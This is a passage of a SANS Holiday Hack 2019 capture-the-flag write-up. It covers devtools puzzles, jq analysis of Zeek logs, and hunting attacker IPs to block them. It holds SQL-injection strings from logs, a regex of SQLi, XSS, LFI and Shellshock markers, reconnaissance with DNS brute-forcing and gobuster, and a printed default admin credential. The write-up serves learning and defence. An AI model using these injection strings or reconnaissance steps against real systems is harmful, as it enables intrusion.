<img alt="shiny_upatree.png" class="align-center" src="/images/sans-christmas-challenge-2019/shiny_upatree.png" />
<p><em>Shiny Upatree says</em></p>
<blockquote>
<p>Psst - hey!</p>
<p>I'm Shinny Upatree, and I know what's going on!</p>
<p>Yeah, that's right - guarding the sleigh shop has made me privvy to some
serious, high-level intel.</p>
<p>In fact, I know WHO is causing all the trouble.</p>
<p>Cindy? Oh no no, not that who. And stop guessing - you'll never figure it
out.</p>
<p>The only way you could would be if you could break into <a class="reference external" href="https://crate.elfu.org/">my crate</a>,
here.</p>
<p>You see, I've written the villain's name down on a piece of paper and
hidden it away securely!</p>
</blockquote>
<p>So, we must try to break into <a class="reference external" href="https://crate.elfu.org/">Shiny's crate</a>. It
seems to be locked with several locks, and we have to solve riddles to find the
codes to unlock them.</p>
<p>It's important to notice that the codes change every time we reload the page,
and every lock must be unlocked in one go. So be careful if you reload the
page, or perform an action that would reload the page (like displaying the
source code via <code>Ctrl+U</code>).</p>
<p>Let's go:</p>
<ol class="arabic simple">
<li>You don't need a clever riddle to open the console and scroll a little.</li>
</ol>
<p>So, let's open the browser console, in the developer tools, and scroll to the
top:</p>
<img alt="lock_1_console.png" class="align-center" src="/images/sans-christmas-challenge-2019/lock_1_console.png" />
<p>We get our first code: <code>AF1XO1BQ</code>.</p>
<ol class="arabic simple" start="2">
<li>Some codes are hard to spy, perhaps they'll show up on pulp with dye?</li>
</ol>
<p>Hmmm, what? I didn't understand anything, so I took a look at the hints:</p>
<ul class="simple">
<li>Most paper is made out of pulp.</li>
<li>How can you view this page on paper?</li>
</ul>
<p>We can view this page, by printing it! Let's try to print it to a PDF file:</p>
<img alt="lock_2_print.png" class="align-center" src="/images/sans-christmas-challenge-2019/lock_2_print.png" />
<p>We get our next code: <code>17OT8MUP</code>.</p>
<ol class="arabic simple" start="3">
<li>This code is still unknown; it was fetched but never shown.</li>
</ol>
<p>Hmm, the riddle seems to imply that the code was downloaded by the browser.
Let's see in our browser network tab:</p>
<img alt="lock_3_fetch.png" class="align-center" src="/images/sans-christmas-challenge-2019/lock_3_fetch.png" />
<p>We get our next code: <code>NZ50BMID</code>.</p>
<ol class="arabic simple" start="4">
<li>Where might we keep the things we forage? Yes, of course: Local barrels!</li>
</ol>
<p>The riddle seems to hint to taking a look at the local storage:</p>
<img alt="lock_4_local_storage.png" class="align-center" src="/images/sans-christmas-challenge-2019/lock_4_local_storage.png" />
<p>We get our next code: <code>TBM5L28P</code>.</p>
<ol class="arabic simple" start="5">
<li>Did you notice the code in the title? It may very well prove vital.</li>
</ol>
<p>We look at the title in the browser's window name:</p>
<img alt="lock_5_browser_title.png" class="align-center" src="/images/sans-christmas-challenge-2019/lock_5_browser_title.png" />
<p>We get our next code: <code>QWSJCUG9</code>.</p>
<ol class="arabic simple" start="6">
<li>In order for this hologram to be effective, it may be necessary to increase
your perspective.</li>
</ol>
<p>I didn't understand the riddle, so let's take a look at a hint:</p>
<ul class="simple">
<li><code>perspective</code> is a css property.</li>
</ul>
<p>Alright, let's take a look at the <code>perspective</code> attribute of the image
next to the lock:</p>
<div class="highlight"><pre><span></span><span class="p">.</span><span class="nc">hologram</span> <span class="p">{</span>
    <span class="k">perspective</span><span class="p">:</span> <span class="mi">15</span><span class="kt">px</span><span class="p">;</span>
    <span class="k">width</span><span class="p">:</span> <span class="mi">150</span><span class="kt">px</span><span class="p">;</span>
    <span class="k">height</span><span class="p">:</span> <span class="mi">100</span><span class="kt">px</span><span class="p">;</span>
    <span class="k">border-radius</span><span class="p">:</span> <span class="mi">20</span><span class="kt">px</span><span class="p">;</span>
    <span class="k">transition</span><span class="p">:</span> <span class="k">perspective</span> <span class="mi">5</span><span class="kt">s</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
<p>Let's increase the <code>perspective</code> attribute:</p>
<div class="highlight"><pre><span></span><span class="p">.</span><span class="nc">hologram</span> <span class="p">{</span>
    <span class="k">perspective</span><span class="p">:</span> <span class="mi">9000</span><span class="kt">px</span><span class="p">;</span>
    <span class="k">width</span><span class="p">:</span> <span class="mi">150</span><span class="kt">px</span><span class="p">;</span>
    <span class="k">height</span><span class="p">:</span> <span class="mi">100</span><span class="kt">px</span><span class="p">;</span>
    <span class="k">border-radius</span><span class="p">:</span> <span class="mi">20</span><span class="kt">px</span><span class="p">;</span>
    <span class="k">transition</span><span class="p">:</span> <span class="k">perspective</span> <span class="mi">5</span><span class="kt">s</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
<img alt="lock_6_hologram.png" class="align-center" src="/images/sans-christmas-challenge-2019/lock_6_hologram.png" />
<p>We can make out the code: <code>6O0X1TVU</code>.</p>
<ol class="arabic simple" start="7">
<li>The font you're seeing is pretty slick, but this lock's code was my first
pick.</li>
</ol>
<p>Let's look at the font attributes in the CSS of the page:</p>
<div class="highlight"><pre><span></span><span class="p">.</span><span class="nc">instructions</span> <span class="p">{</span>
 <span class="k">font-family</span><span class="p">:</span> <span class="s1">&#39;1SWUSZZ2&#39;</span><span class="p">,</span> <span class="s1">&#39;Beth Ellen&#39;</span><span class="p">,</span> <span class="kc">cursive</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
<p>We get the following code: <code>1SWUSZZ2</code>.</p>
<ol class="arabic simple" start="8">
<li>In the event that the .eggs go bad, you must figure out who will be sad.</li>
</ol>
<p>Let's see what event is linked to this <code>.eggs</code> object:</p>
<img alt="lock_8_event.png" class="align-center" src="/images/sans-christmas-challenge-2019/lock_8_event.png" />
<p>The code is <code>VERONICA</code>.</p>
<ol class="arabic simple" start="9">
<li>This next code will be unredacted, but only when all the chakras are
:active.</li>
</ol>
<p><code>:active</code> is a CSS attribute, let's look for <code>chakra</code> in the CSS:</p>
<div class="highlight"><pre><span></span><span class="nt">span</span><span class="p">.</span><span class="nc">chakra</span><span class="p">:</span><span class="nd">nth-child</span><span class="o">(</span><span class="nt">1</span><span class="o">)</span><span class="p">:</span><span class="nd">active</span><span class="p">:</span><span class="nd">after</span> <span class="p">{</span>
  <span class="k">content</span><span class="p">:</span> <span class="s1">&#39;77&#39;</span><span class="p">;</span>
<span class="p">}</span>
<span class="nt">span</span><span class="p">.</span><span class="nc">chakra</span><span class="p">:</span><span class="nd">nth-child</span><span class="o">(</span><span class="nt">2</span><span class="o">)</span><span class="p">:</span><span class="nd">active</span><span class="p">:</span><span class="nd">after</span> <span class="p">{</span>
  <span class="k">content</span><span class="p">:</span> <span class="s1">&#39;QS&#39;</span><span class="p">;</span>
<span class="p">}</span>
<span class="nt">span</span><span class="p">.</span><span class="nc">chakra</span><span class="p">:</span><span class="nd">nth-child</span><span class="o">(</span><span class="nt">3</span><span class="o">)</span><span class="p">:</span><span class="nd">active</span><span class="p">:</span><span class="nd">after</span> <span class="p">{</span>
  <span class="k">content</span><span class="p">:</span> <span class="s1">&#39;X&#39;</span><span class="p">;</span>
<span class="p">}</span>
<span class="nt">span</span><span class="p">.</span><span class="nc">chakra</span><span class="p">:</span><span class="nd">nth-child</span><span class="o">(</span><span class="nt">4</span><span class="o">)</span><span class="p">:</span><span class="nd">active</span><span class="p">:</span><span class="nd">after</span> <span class="p">{</span>
  <span class="k">content</span><span class="p">:</span> <span class="s1">&#39;HI&#39;</span><span class="p">;</span>
<span class="p">}</span>
<span class="nt">span</span><span class="p">.</span><span class="nc">chakra</span><span class="p">:</span><span class="nd">nth-child</span><span class="o">(</span><span class="nt">5</span><span class="o">)</span><span class="p">:</span><span class="nd">active</span><span class="p">:</span><span class="nd">after</span> <span class="p">{</span>
  <span class="k">content</span><span class="p">:</span> <span class="s1">&#39;9&#39;</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
<p>We get the next code: <code>77QSXHI9</code>.</p>
<ol class="arabic simple" start="10">
<li>Oh, no! This lock's out of commission! Pop off the cover and locate what's
missing.</li>
</ol>
<p>Come again? Let's look at the hint:</p>
<ul class="simple">
<li>Use the DOM tree viewer to examine this lock. you can search for items in the
DOM using this view.</li>
<li>You can click and drag elements to reposition them in the DOM tree.</li>
</ul>
<p>Alright, let's use the DOM tree to remove the cover, by dragging and dropping
the cover element:</p>
<img alt="lock_10_no_cover.png" class="align-center" src="/images/sans-christmas-challenge-2019/lock_10_no_cover.png" />
<p>There seems to be a code printed on the PCB: <code>KD29XJ37</code>. But there seems
to be missing three elements on the PCB. If we look around the CSS file, we
see that three elements are linked to the lock #10 <code>c10</code>.</p>
<div class="highlight"><pre><span></span><span class="p">.</span><span class="nc">locks</span> <span class="o">&gt;</span> <span class="nt">li</span> <span class="o">&gt;</span> <span class="p">.</span><span class="nc">lock</span><span class="p">.</span><span class="nc">c10</span> <span class="o">&gt;</span> <span class="p">.</span><span class="nc">component</span><span class="p">.</span><span class="nc">macaroni</span> <span class="p">{</span>
  <span class="k">background</span><span class="p">:</span> <span class="nb">url</span><span class="p">(</span><span class="sx">../../images/mac.png</span><span class="p">)</span> <span class="kc">no-repeat</span><span class="p">;</span>
<span class="p">}</span>

<span class="p">.</span><span class="nc">locks</span> <span class="o">&gt;</span> <span class="nt">li</span> <span class="o">&gt;</span> <span class="p">.</span><span class="nc">lock</span><span class="p">.</span><span class="nc">c10</span> <span class="o">&gt;</span> <span class="p">.</span><span class="nc">component</span><span class="p">.</span><span class="nc">swab</span> <span class="p">{</span>
  <span class="k">background</span><span class="p">:</span> <span class="nb">url</span><span class="p">(</span><span class="sx">../../images/qtip.png</span><span class="p">)</span> <span class="kc">no-repeat</span><span class="p">;</span>
<span class="p">}</span>

<span class="p">.</span><span class="nc">locks</span> <span class="o">&gt;</span> <span class="nt">li</span> <span class="o">&gt;</span> <span class="p">.</span><span class="nc">lock</span><span class="p">.</span><span class="nc">c10</span> <span class="o">&gt;</span> <span class="p">.</span><span class="nc">component</span><span class="p">.</span><span class="nc">gnome</span> <span class="p">{</span>
  <span class="k">background</span><span class="p">:</span> <span class="nb">url</span><span class="p">(</span><span class="sx">../../images/gnome.png</span><span class="p">)</span> <span class="kc">no-repeat</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
<p>Let's look for these elements, <code>macaroni</code>, <code>swab</code>, and
<code>gnome</code>, and drag and drop them on the PCB:</p>
<img alt="lock_10_elements.png" class="align-center" src="/images/sans-christmas-challenge-2019/lock_10_elements.png" />
<p>Now, let's input the code, and unlock the final lock, opening the crate:</p>
<img alt="crate_open.png" class="align-center" src="/images/sans-christmas-challenge-2019/crate_open.png" />
<p>The villain is the Tooth Fairy <strong>gasp</strong>.</p>
</div>
</div>
<div class="section" id="objective-12">
<h2><a class="toc-backref" href="#id40">Objective 12:</a></h2>
<div class="section" id="wunorse-openslae-s-cranberry-pi-challenge">
<h3><a class="toc-backref" href="#id41">Wunorse Openslae's Cranberry Pi Challenge</a></h3>
<div class="highlight"><pre><span></span><span class="go">Some JSON files can get quite busy.</span>
<span class="go">There&#39;s lots to see and do.</span>
<span class="go">Does C&amp;C lurk in our data?</span>
<span class="go">JQ&#39;s the tool for you!</span>

<span class="go">-Wunorse Openslae</span>

<span class="go">Identify the destination IP address with the longest connection duration</span>
<span class="go">using the supplied Zeek logfile. Run runtoanswer to submit your answer.</span>

<span class="gp">elf@a71d36bc6488:~$</span>
</pre></div>
<p>Alright, we must look for the connection with the longest duration. Let's take
a look at this log file:</p>
<div class="highlight"><pre><span></span><span class="gp">elf@a71d36bc6488:~$</span> ls
<span class="go">conn.log</span>
<span class="gp">elf@94a92f24ac33:~$</span> head -n <span class="m">3</span> conn.log
<span class="go">{&quot;ts&quot;:&quot;2019-04-04T20:34:24.698965Z&quot;,&quot;uid&quot;:&quot;CAFvAu2l50Km67tSP5&quot;,&quot;id.orig_h&quot;:&quot;192.168.144.130&quot;,&quot;id.orig_p&quot;:64277,&quot;id.resp_h&quot;:&quot;192.168.144.2&quot;,&quot;id.resp_p&quot;:53,&quot;proto&quot;:&quot;udp&quot;,&quot;service&quot;:&quot;dns&quot;,&quot;duration&quot;:0.320463,&quot;orig_bytes&quot;:94,&quot;resp_bytes&quot;:316,&quot;conn_state&quot;:&quot;SF&quot;,&quot;missed_bytes&quot;:0,&quot;history&quot;:&quot;Dd&quot;,&quot;orig_pkts&quot;:2,&quot;orig_ip_bytes&quot;:150,&quot;resp_pkts&quot;:2,&quot;resp_ip_bytes&quot;:372}</span>
<span class="go">{&quot;ts&quot;:&quot;2019-04-04T20:41:01.862738Z&quot;,&quot;uid&quot;:&quot;CCuAk24L1kIclVKz4l&quot;,&quot;id.orig_h&quot;:&quot;192.168.144.130&quot;,&quot;id.orig_p&quot;:55106,&quot;id.resp_h&quot;:&quot;192.168.144.2&quot;,&quot;id.resp_p&quot;:53,&quot;proto&quot;:&quot;udp&quot;,&quot;service&quot;:&quot;dns&quot;,&quot;duration&quot;:0.000602,&quot;orig_bytes&quot;:47,&quot;resp_bytes&quot;:63,&quot;conn_state&quot;:&quot;SF&quot;,&quot;missed_bytes&quot;:0,&quot;history&quot;:&quot;Dd&quot;,&quot;orig_pkts&quot;:1,&quot;orig_ip_bytes&quot;:75,&quot;resp_pkts&quot;:1,&quot;resp_ip_bytes&quot;:91}</span>
<span class="go">{&quot;ts&quot;:&quot;2019-04-04T20:42:09.277476Z&quot;,&quot;uid&quot;:&quot;CRRCaj4bvzUJRRpmR6&quot;,&quot;id.orig_h&quot;:&quot;192.168.144.130&quot;,&quot;id.orig_p&quot;:59679,&quot;id.resp_h&quot;:&quot;192.168.144.2&quot;,&quot;id.resp_p&quot;:53,&quot;proto&quot;:&quot;udp&quot;,&quot;service&quot;:&quot;dns&quot;,&quot;duration&quot;:0.000923,&quot;orig_bytes&quot;:34,&quot;resp_bytes&quot;:34,&quot;conn_state&quot;:&quot;SF&quot;,&quot;missed_bytes&quot;:0,&quot;history&quot;:&quot;Dd&quot;,&quot;orig_pkts&quot;:1,&quot;orig_ip_bytes&quot;:62,&quot;resp_pkts&quot;:1,&quot;resp_ip_bytes&quot;:62}</span>
</pre></div>
<p>So, the <code>conn.log</code> file is full of JSON data, one object per line, which
has the following interesting attributes:</p>
<ul class="simple">
<li><code>id.resp_h</code>, the destination IP</li>
<li><code>duration</code>, the duration of the connection</li>
</ul>
<p>As the console suggests, we can use <code>jq</code> to parse this data. Let's create
a <code>jq</code> filter that will give us the destination IP with the longest
connection duration. You can use <a class="reference external" href="https://stedolan.github.io/jq/manual/">this guide</a>
to create your own filter.</p>
<div class="highlight"><pre><span></span><span class="gp">elf@94a92f24ac33:~$</span> jq -s <span class="s1">&#39;[.[] | {duration, &quot;id.resp_h&quot;}] | sort_by(.duration) | .[-1].&quot;id.resp_h&quot;&#39;</span> conn.log
</pre></div>
<p>Let's break this down:</p>
<pre class="literal-block">
jq -s [...] conn.log
</pre>
<p>This calls <code>jq</code> and tells it to treat the data in <code>conn.log</code> as a
stream of data (since we have one JSON object per line, and not, say, a full
JSON object in the file).</p>
<pre class="literal-block">
[.[] | {duration, &quot;id.resp_h&quot;}]
</pre>
<p>We create a list of JSON objects, based on the attributes <code>duration</code> and
<code>id.resp_h</code>. Note that we had to put the latter between double quotes,
because of the dot in the attribute's name.</p>
<pre class="literal-block">
| sort_by(.duration)
</pre>
<p>We get the created list, and sort it by the <code>duration</code> attribute.</p>
<pre class="literal-block">
| .[-1].&quot;id.resp_h&quot;
</pre>
<p>We get the last element of the list (index -1) and query its <code>id.resp_h</code>
attribute.</p>
<p>Let's give this a go:</p>
<div class="highlight"><pre><span></span><span class="gp">elf@94a92f24ac33:~$</span> jq -s <span class="s1">&#39;[.[] | {duration, &quot;id.resp_h&quot;}] | sort_by(.duration) | .[-1].&quot;id.resp_h&quot;&#39;</span> conn.log
<span class="go">&quot;13.107.21.200&quot;</span>
<span class="gp">elf@94a92f24ac33:~$</span> runtoanswer
<span class="go">Loading, please wait......</span>



<span class="go">What is the destination IP address with the longes connection duration? 13.107.21.200</span>



<span class="go">Thank you for your analysis, you are spot-on.</span>
<span class="go">I would have been working on that until the early dawn.</span>
<span class="go">Now that you know the features of jq,</span>
<span class="go">You&#39;ll be able to answer other challenges too.</span>

<span class="go">-Wunorse Openslae</span>
</pre></div>
</div>
<div class="section" id="filter-out-poisoned-sources-of-weather-data">
<h3><a class="toc-backref" href="#id42">Filter Out Poisoned Sources of Weather Data</a></h3>
<p>Inside the Sleigh Shop, we find the evil Tooth Fairy:</p>
<img alt="toothfairy.png" class="align-center" src="/images/sans-christmas-challenge-2019/toothfairy.png" />
<p><em>The Tooth Fairy says</em></p>
<blockquote>
<p>I’m the Tooth Fairy, the mastermind behind the plot to destroy the holiday
season.</p>
<p>I hate how Santa is so beloved, but only works one day per year!</p>
<p>He has all of the resources of the North Pole and the elves to help him
too.</p>
<p>I run a solo operation, toiling year-round collecting deciduous bicuspids
and more from children.</p>
<p>But I get nowhere near the gratitude that Santa gets. He needs to share his
holiday resources with the rest of us!</p>
<p>But, although you found me, you haven’t foiled my plot!</p>
<p>Santa’s sleigh will NOT be able to find its way.</p>
<p>I will get my revenge and respect!</p>
<p>I want my own holiday, National Tooth Fairy Day, to be the most popular
holiday on the calendar!!!</p>
</blockquote>
<img alt="wunorse_openslaer.png" class="align-center" src="/images/sans-christmas-challenge-2019/wunorse_openslae.png" />
<p><em>Wunorse Openslae says</em></p>
<blockquote>
<p>Hey, you know what? We've got a crisis here.</p>
<p>You see, Santa's flight route is planned by a complex set of machine
learning algorithms which use available weather data.</p>
<p>All the weather stations are reporting severe weather to Santa's Sleigh. I
think someone might be forging intentionally false weather data!</p>
<p>I'm so flummoxed I can't even remember how to login!</p>
<p>Hmm... Maybe the Zeek http.log could help us.</p>
<p>I worry about LFI, XSS, and SQLi in the Zeek log - oh my!</p>
<p>And I'd be shocked if there weren't some shell stuff in there too.</p>
<p>I'll bet if you pick through, you can find some naughty data from naughty
hosts and block it in the firewall.</p>
<p>If you find a log entry that definitely looks bad, try pivoting off other
unusual attributes in that entry to find more bad IPs.</p>
<p>The sleigh's machine learning device (SRF) needs most of the malicious IPs
blocked in order to calculate a good route.</p>
<p>Try not to block many legitimate weather station IPs as that could also
cause route calculation failure.</p>
<p>Remember, when looking at JSON data, jq is the tool for you!</p>
</blockquote>
<p>Alright, let's download this <a class="reference external" href="/docs/sans-christmas-challenge-2019/http.log.gz">log file</a>
and take a look inside.</p>
<p>So, this file contains one big JSON object, and we must find traces of SQL
injections, XSS, local file inclusion, and shell shock exploits. When we have
identified at least 100 bad IPs, we can block them in the <a class="reference external" href="https://srf.elfu.org/">Sleigh Route Finder</a> so that Santa can calculate the correct route for
his present delivery.</p>
<p>But first, how can we log into the Sleigh Route Finder website? We don't have
any credentials and Wunorse don't remember them. If we take a look at the
<a class="reference external" href="/docs/sans-christmas-challenge-2019/ElfUResearchLabsSuperSledOMaticQuickStartGuideV1.2.pdf">quick start guide</a>
we decrypted earlier, we find an interesting piece of information:</p>
<blockquote>
The default login credentials should be changed on startup and can be found
in the readme in the ElfU Research Labs git repository.</blockquote>
<p>I first spent some time trying to find this git repository. I performed DNS
bruteforce against the elfu.org domain, but didn't find anything interesting.
I also try to use <a class="reference external" href="https://github.com/OJ/gobuster/">gobuster</a> against the
<a class="reference external" href="https://srf.elfu.org">https://srf.elfu.org</a> website, but also to no avail. I then tried several
<a class="reference external" href="https://www.owasp.org/index.php/Conduct_search_engine_discovery/reconnaissance_for_information_leakage_(OTG-INFO-001)">Google Dorks</a>
to try and find this mysterious git repository, but the only thing I found
was this <a class="reference external" href="https://downloads.elfu.org/LetterOfWintryMagic.pdf">weird letter</a>
of Wintry Magic, that I could make no sense of.</p>
<p>I then thought that maybe we could try to find login information in the Zeek
log file. Indeed, the different events have a <code>username</code> and a
<code>password</code> attribute. Maybe the login information we're looking for is
there? Let's build a <code>jq</code> filter to find these information:</p>
<div class="highlight"><pre><span></span><span class="gp">$</span> jq <span class="s1">&#39;.[] | select(.username != &quot;-&quot;) | {username, password}&#39;</span> http.log
<span class="go">{</span>
<span class="go">  &quot;username&quot;: &quot;q1ki9&quot;,</span>
<span class="go">  &quot;password&quot;: &quot;-&quot;</span>
<span class="go">}</span>
<span class="go">{</span>
<span class="go">  &quot;username&quot;: &quot;servlet&quot;,</span>
<span class="go">  &quot;password&quot;: &quot;-&quot;</span>
<span class="go">}</span>
<span class="go">{</span>
<span class="go">  &quot;username&quot;: &quot;support&quot;,</span>
<span class="go">  &quot;password&quot;: &quot;-&quot;</span>
<span class="go">}</span>
<span class="go">{</span>
<span class="go">  &quot;username&quot;: &quot;admin&quot;,</span>
<span class="go">  &quot;password&quot;: &quot;-&quot;</span>
<span class="go">}</span>
<span class="go">{</span>
<span class="go">  &quot;username&quot;: &quot;Admin&quot;,</span>
<span class="go">  &quot;password&quot;: &quot;-&quot;</span>
<span class="go">}</span>
<span class="go">{</span>
<span class="go">  &quot;username&quot;: &quot;-r nessus&quot;,</span>
<span class="go">  &quot;password&quot;: &quot;-&quot;</span>
<span class="go">}</span>
<span class="go">{</span>
<span class="go">  &quot;username&quot;: &quot;admin&quot;,</span>
<span class="go">  &quot;password&quot;: &quot;-&quot;</span>
<span class="go">}</span>
<span class="go">{</span>
<span class="go">  &quot;username&quot;: &quot;admin&quot;,</span>
<span class="go">  &quot;password&quot;: &quot;-&quot;</span>
<span class="go">}</span>
<span class="go">{</span>
<span class="go">  &quot;username&quot;: &quot;q1ki9&quot;,</span>
<span class="go">  &quot;password&quot;: &quot;-&quot;</span>
<span class="go">}</span>
<span class="go">{</span>
<span class="go">  &quot;username&quot;: &quot;6666&quot;,</span>
<span class="go">  &quot;password&quot;: &quot;-&quot;</span>
<span class="go">}</span>
<span class="go">{</span>
<span class="go">  &quot;username&quot;: &quot;6666&quot;,</span>
<span class="go">  &quot;password&quot;: &quot;-&quot;</span>
<span class="go">}</span>
<span class="go">{</span>
<span class="go">  &quot;username&quot;: &quot;6666&quot;,</span>
<span class="go">  &quot;password&quot;: &quot;-&quot;</span>
<span class="go">}</span>
<span class="go">{</span>
<span class="go">  &quot;username&quot;: &quot;&#39; or &#39;1=1&quot;,</span>
<span class="go">  &quot;password&quot;: &quot;-&quot;</span>
<span class="go">}</span>
<span class="go">{</span>
<span class="go">  &quot;username&quot;: &quot;&#39; or &#39;1=1&quot;,</span>
<span class="go">  &quot;password&quot;: &quot;-&quot;</span>
<span class="go">}</span>
<span class="go">{</span>
<span class="go">  &quot;username&quot;: &quot;&#39; or &#39;1=1&quot;,</span>
<span class="go">  &quot;password&quot;: &quot;-&quot;</span>
<span class="go">}</span>
<span class="go">{</span>
<span class="go">  &quot;username&quot;: &quot;&#39; or &#39;1=1&quot;,</span>
<span class="go">  &quot;password&quot;: &quot;-&quot;</span>
<span class="go">}</span>
<span class="go">{</span>
<span class="go">  &quot;username&quot;: &quot;root&quot;,</span>
<span class="go">  &quot;password&quot;: &quot;-&quot;</span>
<span class="go">}</span>
<span class="go">{</span>
<span class="go">  &quot;username&quot;: &quot;comcomcom&quot;,</span>
<span class="go">  &quot;password&quot;: &quot;-&quot;</span>
<span class="go">}</span>
<span class="go">{</span>
<span class="go">  &quot;username&quot;: &quot;(empty)&quot;,</span>
<span class="go">  &quot;password&quot;: &quot;-&quot;</span>
<span class="go">}</span>
<span class="go">{</span>
<span class="go">  &quot;username&quot;: &quot;(empty)&quot;,</span>
<span class="go">  &quot;password&quot;: &quot;-&quot;</span>
<span class="go">}</span>
<span class="go">{</span>
<span class="go">  &quot;username&quot;: &quot;(empty)&quot;,</span>
<span class="go">  &quot;password&quot;: &quot;-&quot;</span>
<span class="go">}</span>
<span class="go">{</span>
<span class="go">  &quot;username&quot;: &quot;admin&quot;,</span>
<span class="go">  &quot;password&quot;: &quot;-&quot;</span>
<span class="go">}</span>
<span class="go">{</span>
<span class="go">  &quot;username&quot;: &quot;(empty)&quot;,</span>
<span class="go">  &quot;password&quot;: &quot;-&quot;</span>
<span class="go">}</span>
</pre></div>
<p>Well, we can see the SQL injection attempts, but no useful credentials. Then,
I looked back at what was said in the quick start guide: the credentials are in
a readme file. So, let's look for readme files in the Zeek logs:</p>
<div class="highlight"><pre><span></span><span class="gp">$</span> jq <span class="s1">&#39;.[] | select(.uri | test(&quot;readme&quot;; &quot;i&quot;)) | {host, uri, status_code}&#39;</span> http.log
<span class="go">{</span>
<span class="go">  &quot;host&quot;: &quot;srf.elfu.org&quot;,</span>
<span class="go">  &quot;uri&quot;: &quot;/README.md&quot;,</span>
<span class="go">  &quot;status_code&quot;: 200</span>
<span class="go">}</span>
<span class="go">{</span>
<span class="go">  &quot;host&quot;: &quot;srf.elfu.org&quot;,</span>
<span class="go">  &quot;uri&quot;: &quot;/README/&quot;,</span>
<span class="go">  &quot;status_code&quot;: 404</span>
<span class="go">}</span>
<span class="go">{</span>
<span class="go">  &quot;host&quot;: &quot;srf.elfu.org&quot;,</span>
<span class="go">  &quot;uri&quot;: &quot;/cgi-bin/README.TXT&quot;,</span>
<span class="go">  &quot;status_code&quot;: 404</span>
<span class="go">}</span>
</pre></div>
<p>There's only one entry with an HTTP status code of 200. Let's try to download
the file <a class="reference external" href="https://srf.elfu.org/README.md">https://srf.elfu.org/README.md</a>:</p>
<div class="highlight"><pre><span></span># Sled-O-Matic - Sleigh Route Finder Web API

### Installation

```
sudo apt install python3-pip
sudo python3 -m pip install -r requirements.txt
```

#### Running:

`python3 ./srfweb.py`

#### Logging in:

You can login using the default admin pass:

<span class="hll">`admin 924158F9522B3744F5FCD4D10FAC4356`
</span>
However, it&#39;s recommended to change this in the sqlite db to something custom
</pre></div>
<p>Hurray, we have our credentials! Now we just have to find the malicious IP
addresses to block.</p>
<p>By taking a look at the logs, we can search for the following terms for the
different attacks:</p>
<ul class="simple">
<li>For SQLi : <code>SELECT</code> and <code>or&nbsp;</code></li>
<li>For XSS : <code>&lt;script&gt;</code></li>
<li>For LFI : <code>/etc</code>, <code>../</code>, and <code>./.</code></li>
<li>For Shell-shock : <code>()</code></li>
</ul>
<p>We'll look for these values in the <code>uri</code>, <code>user_agent</code>,
<code>username</code>, and <code>host</code> attributes:</p>
<div class="highlight"><pre><span></span><span class="gp">$</span> jq <span class="s1">&#39;.[] | select((.uri,.user_agent,.username,.host | test(&quot;SELECT|&lt;script&gt;|\\(\\)|\\.\\./|\\./\\.|/etc|or &quot;)))&#39;</span> http.log &gt; attacks.json
</pre></div>
<p>We can see our regexp that we had to escape the <code>()</code> and the <code>.</code>.</p>
<p>Alright, how many different IP addresses is that?</p>
<div class="highlight"><pre><span></span><span class="gp">$</span> grep id.orig_h attacks.json <span class="p">|</span> sort -u <span class="p">|</span> wc -l
<span class="go">62</span>
</pre></div>
<p>Hmm, pretty far from the 100 necessary IP addresses. Wunorse Openslae advises
us to look at the attributes of known bad events. Maybe we can try to identify
other bad IP addresses by using the known bad user agents: it's possible that
a known bad agent is using several IP addresses. We can try to identify them
by their user agents.</p>
<p>First, let's create a list of known bad user agents. We'll remove user agents
that were used to perform attacks such as SQL injections or Shell-shock.</p>
<div class="highlight"><pre><span></span><span class="gp">$</span> grep user_agent attacks.json <span class="p">|</span> cut -d: -f <span class="m">2</span> <span class="p">|</span> cut -d<span class="s1">&#39;&quot;&#39;</span> -f <span class="m">2</span> <span class="p">|</span> sort -u <span class="p">|</span> grep -vE <span class="s1">&#39;SELECT|\(\)|google&#39;</span> &gt; bad_user_agents.txt
</pre></div>
<p>Now, let's query our events matching our bad user agents:</p>
<div class="highlight"><pre><span></span><span class="gp">$</span> <span class="k">while</span> <span class="nb">read</span> user_agent<span class="p">;</span> <span class="k">do</span> jq <span class="s1">&#39;.[] | select(.user_agent == &quot;&#39;</span><span class="s2">&quot;</span><span class="nv">$user_agent</span><span class="s2">&quot;</span><span class="s1">&#39;&quot;)&#39;</span> http.log<span class="p">;</span> <span class="k">done</span> &lt; bad_user_agents.txt &gt; malicious_events_by_user_agents.json
</pre></div>
<p>Now, let's extract our unique IP addresses:</p>
<div class="highlight"><pre><span></span><span class="gp">$</span> cat attacks.json malicious_events_by_user_agents.json<span class="p">|</span> jq -s <span class="s1">&#39;.[] | .&quot;id.orig_h&quot;&#39;</span> <span class="p">|</span> sort -u <span class="p">|</span> tr -d <span class="s1">&#39;&quot;&#39;</span>
<span class="go">0.216.249.31</span>
<span class="go">10.122.158.57</span>
<span class="go">10.155.246.29</span>
<span class="go">102.143.16.184</span>
<span class="go">103.235.93.133</span>
<span class="go">104.179.109.113</span>
<span class="go">106.132.195.153</span>
<span class="go">106.93.213.219</span>
<span class="go">111.81.145.191</span>
<span class="go">116.116.98.205</span>
<span class="go">118.196.230.170</span>
<span class="go">118.26.57.38</span>
<span class="go">121.144.25.34</span>
<span class="go">[...]</span>
</pre></div>
<p>We can now paste our list of IPs to the SRF web site:</p>
<div class="highlight"><pre><span></span><span class="gp">$</span> cat attacks.json malicious_events_by_user_agents_bad_regexp.json<span class="p">|</span> jq -s <span class="s1">&#39;.[] | .&quot;id.orig_h&quot;&#39;</span> <span class="p">|</span> sort -u <span class="p">|</span> tr -d <span class="s1">&#39;&quot;&#39;</span> <span class="p">|</span> paste -s -d,
<span class="go">0.216.249.31,10.122.158.57,10.155.246.29,102.143.16.184,103.235.93.133,104.179.109.113,106.132.195.153,106.93.213.219,111.81.145.191,116.116.98.205,118.196.230.170,118.26.57.38,121.144.25.34,121.7.186.163,123.127.233.97,126.102.12.53,129.121.121.48,131.186.145.73,13.39.153.254,135.203.243.43,135.32.99.116,136.59.204.152,140.60.154.239[...]</span>
</pre></div>
<p>We submit it, aaaand:</p>
<img alt="srf_route_id.png" class="align-center" src="/images/sans-christmas-challenge-2019/srf_route_id.png" />
<p>We get a correct route ID!</p>
<p>Now, during the write-up, I tried submitting the exact same IP list, and it
didn't work, soooo whaddup SANS?</p>
<p>Anyway, we can now access the Bell Tower:</p>
